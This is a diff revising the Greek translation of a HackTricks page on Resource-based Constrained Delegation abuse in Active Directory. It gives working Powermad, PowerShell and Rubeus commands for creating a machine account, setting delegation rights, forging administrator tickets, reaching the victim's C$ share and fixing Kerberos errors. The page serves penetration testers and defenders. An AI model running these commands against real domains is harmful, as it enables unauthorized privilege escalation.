@@ -1,51 +1,52 @@
-# Περιορισμένη ανάθεση βάσει πόρων
+# Resource-based Constrained Delegation
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Άλλοι τρόποι υποστήριξης του HackTricks:
-
-* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
-## Βασικές αρχές της περιορισμένης ανάθεσης βάσει πόρων
+## Βασικές Αρχές της Resource-based Constrained Delegation
 
-Αυτό είναι παρόμοιο με τη βασική [Περιορισμένη Ανάθεση](constrained-delegation.md) αλλά **αντί** να δίνει δικαιώματα σε ένα **αντικείμενο να υποκαταστήσει οποιονδήποτε χρήστη έναντι ενός υπηρεσίας**. Η περιορισμένη ανάθεση βάσει πόρων **ορίζει στο αντικείμενο ποιος μπορεί να υποκαταστήσει οποιονδήποτε χρήστη έναντι αυτού**.
+Αυτό είναι παρόμοιο με την βασική [Constrained Delegation](constrained-delegation.md) αλλά **αντί** να δίνει δικαιώματα σε ένα **αντικείμενο** να **παριστάνει οποιονδήποτε χρήστη απέναντι σε μια υπηρεσία**. Η Resource-based Constrained Delegation **ορίζει** στο **αντικείμενο ποιος μπορεί να παριστάνει οποιονδήποτε χρήστη απέναντί του**.
 
-Σε αυτήν την περίπτωση, το περιορισμένο αντικείμενο θα έχει ένα χαρακτηριστικό που ονομάζεται _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ με το όνομα του χρήστη που μπορεί να υποκαταστήσει οποιονδήποτε άλλο χρήστη έναντι αυτού.
+Σε αυτή την περίπτωση, το περιορισμένο αντικείμενο θα έχει ένα χαρακτηριστικό που ονομάζεται _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ με το όνομα του χρήστη που μπορεί να παριστάνει οποιονδήποτε άλλο χρήστη απέναντί του.
 
-Μια άλλη σημαντική διαφορά από αυτήν την Περιορισμένη Ανάθεση στις άλλες αναθέσεις είναι ότι οποιοσδήποτε χρήστης με **δικαιώματα εγγραφής σε ένα λογαριασμό μηχανής** (_GenericAll/GenericWrite/WriteDacl/WriteProperty κλπ_) μπορεί να ορίσει το _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (Στις άλλες μορφές Ανάθεσης χρειάζονταν δικαιώματα διαχειριστή του τομέα).
+Μια άλλη σημαντική διαφορά από αυτή την Constrained Delegation σε άλλες delegations είναι ότι οποιοσδήποτε χρήστης με **δικαιώματα εγγραφής σε έναν λογαριασμό μηχανής** (_GenericAll/GenericWrite/WriteDacl/WriteProperty κ.λπ.) μπορεί να ορίσει το _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (Σε άλλες μορφές Delegation χρειάζεστε δικαιώματα διαχειριστή τομέα).
 
 ### Νέες Έννοιες
 
-Πίσω στην Περιορισμένη Ανάθεση είχε αναφερθεί ότι η σημαία **`TrustedToAuthForDelegation`** μέσα στην τιμή _userAccountControl_ του χρήστη απαιτείται για να πραγματοποιηθεί ένα **S4U2Self**. Αλλά αυτό δεν είναι εντελώς αλήθεια.\
-Η πραγματικότητα είναι ότι ακόμη και χωρίς αυτήν την τιμή, μπορείτε να πραγματοποιήσετε ένα **S4U2Self** εναντίον οποιουδήποτε χρήστη αν είστε ένα **service** (έχετε ένα SPN) αλλά, αν **έχετε το `TrustedToAuthForDelegation`** το επιστρεφόμενο TGS θα είναι **Forwardable** και αν **δεν έχετε** αυτήν τη σημαία το επιστρεφόμενο TGS **δεν** θα είναι **Forwardable**.
+Στην Constrained Delegation είχε αναφερθεί ότι η **`TrustedToAuthForDelegation`** σημαία μέσα στην τιμή _userAccountControl_ του χρήστη είναι απαραίτητη για να εκτελέσετε ένα **S4U2Self.** Αλλά αυτό δεν είναι εντελώς αλήθεια.\
+Η πραγματικότητα είναι ότι ακόμη και χωρίς αυτή την τιμή, μπορείτε να εκτελέσετε ένα **S4U2Self** απέναντι σε οποιονδήποτε χρήστη αν είστε μια **υπηρεσία** (έχετε ένα SPN) αλλά, αν έχετε **`TrustedToAuthForDelegation`** το επιστρεφόμενο TGS θα είναι **Forwardable** και αν **δεν έχετε** αυτή τη σημαία το επιστρεφόμενο TGS **δεν θα** είναι **Forwardable**.
 
-Ωστόσο, αν το **TGS** που χρησιμοποιείται στο **S4U2Proxy** **ΔΕΝ είναι Forwardable** προσπαθώντας να εκμεταλλευτείτε μια **βασική Περιορισμένη Ανάθεση** **δεν θα λειτουργήσει**. Αλλά αν προσπαθείτε να εκμεταλλευτείτε μια **Περιορισμένη Ανάθεση βάσει πόρων, θα λειτουργήσει** (αυτό δεν είναι μια ευπάθεια, είναι μια λειτουργία, φαίνεται).
+Ωστόσο, αν το **TGS** που χρησιμοποιείται στο **S4U2Proxy** είναι **NOT Forwardable** προσπαθώντας να εκμεταλλευτείτε μια **βασική Constrain Delegation** δεν **θα λειτουργήσει**. Αλλά αν προσπαθείτε να εκμεταλλευτείτε μια **Resource-Based constrain delegation, θα λειτουργήσει** (αυτό δεν είναι ευπάθεια, είναι χαρακτηριστικό, προφανώς).
 
-### Δομή επίθεσης
+### Δομή Επίθεσης
 
-> Αν έχετε **ισοδύναμα δικαιώματα εγγραφής** σε ένα **λογαριασμό Υπολογιστή** μπορείτε να αποκτήσετε **προνομιακή πρόσβαση** σε αυτό τον υπολογιστή.
+> Αν έχετε **ισοδύναμα δικαιώματα εγγραφής** σε έναν **λογαριασμό Υπολογιστή** μπορείτε να αποκτήσετε **προνομιακή πρόσβαση** σε αυτή τη μηχανή.
 
-Υποθέστε ότι ο επιτιθέμενος έχει ήδη **ισοδύναμα δικαιώματα εγγραφής στον υπολογιστή θύματος**.
+Ας υποθέσουμε ότι ο επιτιθέμενος έχει ήδη **ισοδύναμα δικαιώματα εγγραφής πάνω στον υπολογιστή του θύματος**.
 
-1. Ο επιτιθέμενος **διαρρήγνει** ένα λογαριασμό που έχει ένα **SPN** ή **δημιουργεί έναν** (“Υπηρεσία Α”). Σημειώστε ότι **οποιοσδήποτε** _Διαχειριστής Χρήστης_ χωρίς κανένα άλλο ειδικό προνόμιο μπορεί να **δημιουργήσει** μέχρι 10 **αντικείμενα Υπολογιστή (**_**MachineAccountQuota**_**)** και να τους ορίσει ένα SPN. Έτσι ο επιτιθέμενος μπορεί απλά να δημιουργήσει ένα αντικείμενο Υπολογιστή και να ορίσει ένα SPN.
-2. Ο επιτιθέμενος **καταχράζεται το δικαίωμα ΕΓΓΡΑΦΗΣ** του στον υπολογιστή θύματος (Υπηρεσία Β) για να ρυθμίσει **περιορισμένη ανάθεση βάσει πόρων για να επιτρέψει στην Υπηρεσία Α να υποκαταστήσει οποιονδήποτε χρήστη** έναντι αυτού του υπολογιστή θύματος (Υπηρεσία Β).
-3. Ο επιτιθέμενος χρησιμοποιεί το Rubeus για να πραγματοποιήσει μια **πλήρη επίθεση S4U** (S4U2Self και S4U2Proxy) από την Υπηρεσία Α στην Υπηρεσία Β για έναν χρήστη **με προνομιακή πρόσβαση στην Υπηρεσία Β**.
-1. S4U2Self (από τον λογαριασμό με τον SPN που διαρράγηκε/δημιουργήθηκε): Ζητήστε ένα **TGS του Διαχειριστή προς εμένα** (Μη Forwardable).
+1. Ο επιτιθέμενος **παραβιάζει** έναν λογαριασμό που έχει ένα **SPN** ή **δημιουργεί έναν** (“Υπηρεσία A”). Σημειώστε ότι **οποιοσδήποτε** _Διαχειριστής Χρήστης_ χωρίς καμία άλλη ειδική προνομία μπορεί να **δημιουργήσει** μέχρι 10 **αντικείμενα Υπολογιστή (**_**MachineAccountQuota**_**)** και να τους ορίσει ένα **SPN**. Έτσι, ο επιτιθέμενος μπορεί απλά να δημιουργήσει ένα αντικείμενο Υπολογιστή και να ορίσει ένα SPN.
+2. Ο επιτιθέμενος **καταχράται το δικαίωμα ΕΓΓΡΑΦΗΣ** του πάνω στον υπολογιστή του θύματος (ΥπηρεσίαB) για να ρυθμίσει **resource-based constrained delegation ώστε να επιτρέψει στην ΥπηρεσίαA να παριστάνει οποιονδήποτε χρήστη** απέναντι σε αυτόν τον υπολογιστή του θύματος (ΥπηρεσίαB).
+3. Ο επιτιθέμενος χρησιμοποιεί το Rubeus για να εκτελέσει μια **πλήρη επίθεση S4U** (S4U2Self και S4U2Proxy) από την Υπηρεσία A στην Υπηρεσία B για έναν χρήστη **με προνομιακή πρόσβαση στην Υπηρεσία B**.
+1. S4U2Self (από τον λογαριασμό SPN που παραβιάστηκε/δημιουργήθηκε): Ζητήστε ένα **TGS του Διαχειριστή για μένα** (Not Forwardable).
 2. S4U2Proxy: Χρησιμοποιήστε το **μη Forwardable TGS** του προηγούμενου βήματος για να ζητήσετε ένα **TGS** από τον **Διαχειριστή** προς τον **υπολογιστή θύμα**.
-3. Ακόμη κι αν χρησιμοποιείτε ένα μη Forwardable TGS, καθώς εκμεταλλεύεστε περιορισμένη ανάθεση βάσει πόρων, θα λειτουργήσει.
-4. Ο επιτιθέμενος μπορεί να **περάσει το εισιτήριο** και να **υποκαταστήσει** τον χρήστη για να κερδίσει **πρόσβαση στην υπηρεσία Β θύματος**.
+3. Ακόμη και αν χρησιμοποιείτε ένα μη Forwardable TGS, καθώς εκμεταλλεύεστε την Resource-based constrained delegation, θα λειτουργήσει.
+4. Ο επιτιθέμενος μπορεί να **περάσει το εισιτήριο** και να **παριστάνει** τον χρήστη για να αποκτήσει **πρόσβαση στην ΥπηρεσίαB του θύματος**.
 
 Για να ελέγξετε το _**MachineAccountQuota**_ του τομέα μπορείτε να χρησιμοποιήσετε:
 ```powershell
@@ -53,9 +54,9 @@ Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select Ma
 ```
 ## Επίθεση
 
-### Δημιουργία ενός Αντικειμένου Υπολογιστή
+### Δημιουργία Αντικειμένου Υπολογιστή
 
-Μπορείτε να δημιουργήσετε ένα αντικείμενο υπολογιστή μέσα στον τομέα χρησιμοποιώντας το [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
+Μπορείτε να δημιουργήσετε ένα αντικείμενο υπολογιστή μέσα στο τομέα χρησιμοποιώντας [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
 ```powershell
 import-module powermad
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -63,9 +64,9 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 # Check if created
 Get-DomainComputer SERVICEA
 ```
-### Διαμόρφωση Περιορισμένης Ανάθεσης με Βάση τον Πόρο
+### Ρύθμιση R**esource-based Constrained Delegation**
 
-**Χρησιμοποιώντας το άρθρωμα PowerShell του Active Directory**
+**Χρησιμοποιώντας το module PowerShell του activedirectory**
 ```powershell
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
@@ -85,45 +86,45 @@ msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
 ```
-### Εκτέλεση μιας πλήρους επίθεσης S4U
+### Εκτέλεση πλήρους επίθεσης S4U
 
-Καταρχάς, δημιουργήσαμε το νέο αντικείμενο Υπολογιστή με τον κωδικό πρόσβασης `123456`, οπότε χρειαζόμαστε το hash του συγκεκριμένου κωδικού:
+Πρώτα απ' όλα, δημιουργήσαμε το νέο αντικείμενο Υπολογιστή με τον κωδικό πρόσβασης `123456`, οπότε χρειαζόμαστε το hash αυτού του κωδικού πρόσβασης:
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
-Αυτό θα εκτυπώσει τις κατακευές RC4 και AES για αυτόν τον λογαριασμό.\
-Τώρα, η επίθεση μπορεί να πραγματοποιηθεί:
+Αυτό θα εκτυπώσει τους κατακερματισμούς RC4 και AES για αυτόν τον λογαριασμό.\
+Τώρα, η επίθεση μπορεί να εκτελεστεί:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-Μπορείτε να δημιουργήσετε περισσότερα εισιτήρια απλά ρωτώντας μία φορά χρησιμοποιώντας την παράμετρο `/altservice` του Rubeus:
+Μπορείτε να δημιουργήσετε περισσότερα εισιτήρια απλά ζητώντας μία φορά χρησιμοποιώντας την παράμετρο `/altservice` του Rubeus:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 {% hint style="danger" %}
-Σημειώστε ότι οι χρήστες έχουν ένα χαρακτηριστικό που ονομάζεται "**Δεν μπορεί να ανατεθεί**". Αν ένας χρήστης έχει αυτό το χαρακτηριστικό σε True, δεν θα μπορείτε να υποδείξετε την ταυτότητά του. Αυτή η ιδιότητα μπορεί να βρεθεί μέσα στο bloodhound.
+Σημειώστε ότι οι χρήστες έχουν ένα χαρακτηριστικό που ονομάζεται "**Δεν μπορεί να ανατεθεί**". Εάν ένας χρήστης έχει αυτό το χαρακτηριστικό σε True, δεν θα μπορείτε να τον προσποιηθείτε. Αυτή η ιδιότητα μπορεί να προβληθεί μέσα στο bloodhound.
 {% endhint %}
 
 ### Πρόσβαση
 
-Η τελευταία γραμμή εντολής θα εκτελέσει την **πλήρη επίθεση S4U και θα ενθυλακώσει το TGS** από τον Διαχειριστή στον υπολογιστή-θύμα στην **μνήμη**.\
+Η τελευταία γραμμή εντολών θα εκτελέσει την **πλήρη επίθεση S4U και θα εισάγει το TGS** από τον Διαχειριστή στον θύμα υπολογιστή στη **μνήμη**.\
 Σε αυτό το παράδειγμα ζητήθηκε ένα TGS για την υπηρεσία **CIFS** από τον Διαχειριστή, οπότε θα μπορείτε να έχετε πρόσβαση στο **C$**:
 ```bash
 ls \\victim.domain.local\C$
 ```
-### Κατάχρηση διαφορετικών εισιτηρίων υπηρεσιών
+### Κατάχρηση διαφόρων υπηρεσιών εισιτηρίων
 
 Μάθετε για τα [**διαθέσιμα εισιτήρια υπηρεσιών εδώ**](silver-ticket.md#available-services).
 
 ## Σφάλματα Kerberos
 
-* **`KDC_ERR_ETYPE_NOTSUPP`**: Αυτό σημαίνει ότι το Kerberos είναι ρυθμισμένο να μη χρησιμοποιεί DES ή RC4 και εσείς παρέχετε μόνο το hash RC4. Παρέχετε στο Rubeus τουλάχιστον το hash AES256 (ή απλά παρέχετε τα hashes rc4, aes128 και aes256). Παράδειγμα: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
-* **`KRB_AP_ERR_SKEW`**: Αυτό σημαίνει ότι ο χρόνος του τρέχοντος υπολογιστή είναι διαφορετικός από αυτόν του DC και το Kerberos δεν λειτουργεί σωστά.
-* **`preauth_failed`**: Αυτό σημαίνει ότι το δεδομένο όνομα χρήστη + hashes δεν λειτουργούν για σύνδεση. Ίσως έχετε ξεχάσει να βάλετε το "$" μέσα στο όνομα χρήστη κατά τη δημιουργία των hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
+* **`KDC_ERR_ETYPE_NOTSUPP`**: Αυτό σημαίνει ότι το kerberos είναι ρυθμισμένο να μην χρησιμοποιεί DES ή RC4 και παρέχετε μόνο το hash RC4. Παρέχετε στο Rubeus τουλάχιστον το hash AES256 (ή απλά παρέχετε τα hashes rc4, aes128 και aes256). Παράδειγμα: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+* **`KRB_AP_ERR_SKEW`**: Αυτό σημαίνει ότι η ώρα του τρέχοντος υπολογιστή είναι διαφορετική από αυτήν του DC και το kerberos δεν λειτουργεί σωστά.
+* **`preauth_failed`**: Αυτό σημαίνει ότι το δεδομένο όνομα χρήστη + hashes δεν λειτουργούν για είσοδο. Ίσως να ξεχάσατε να βάλετε το "$" μέσα στο όνομα χρήστη κατά την παραγωγή των hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
 * **`KDC_ERR_BADOPTION`**: Αυτό μπορεί να σημαίνει:
-  * Ο χρήστης που προσπαθείτε να υποκαταστήσετε δεν μπορεί να έχει πρόσβαση στην επιθυμητή υπηρεσία (επειδή δεν μπορείτε να την υποκαταστήσετε ή διότι δεν έχει αρκετά προνόμια)
-  * Η ζητούμενη υπηρεσία δεν υπάρχει (αν ζητήσετε ένα εισιτήριο για το winrm αλλά το winrm δεν εκτελείται)
-  * Το fakecomputer που δημιουργήθηκε έχει χάσει τα προνόμια του πάνω στο ευάλωτο διακομιστή και πρέπει να τους επαναφέρετε.
+* Ο χρήστης που προσπαθείτε να προσποιηθείτε δεν μπορεί να έχει πρόσβαση στην επιθυμητή υπηρεσία (επειδή δεν μπορείτε να τον προσποιηθείτε ή επειδή δεν έχει αρκετά δικαιώματα)
+* Η ζητούμενη υπηρεσία δεν υπάρχει (αν ζητήσετε ένα εισιτήριο για winrm αλλά το winrm δεν εκτελείται)
+* Ο ψεύτικος υπολογιστής που δημιουργήθηκε έχει χάσει τα δικαιώματά του πάνω στον ευάλωτο διακομιστή και πρέπει να τα επαναφέρετε.
 
 ## Αναφορές
 
@@ -136,16 +137,17 @@ ls \\victim.domain.local\C$
 
 {% embed url="https://websec.nl/" %}
 
+{% hint style="success" %}
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Υποστήριξη HackTricks</summary>
 
-Άλλοι τρόποι υποστήριξης του HackTricks:
-
-* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο GitHub.
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
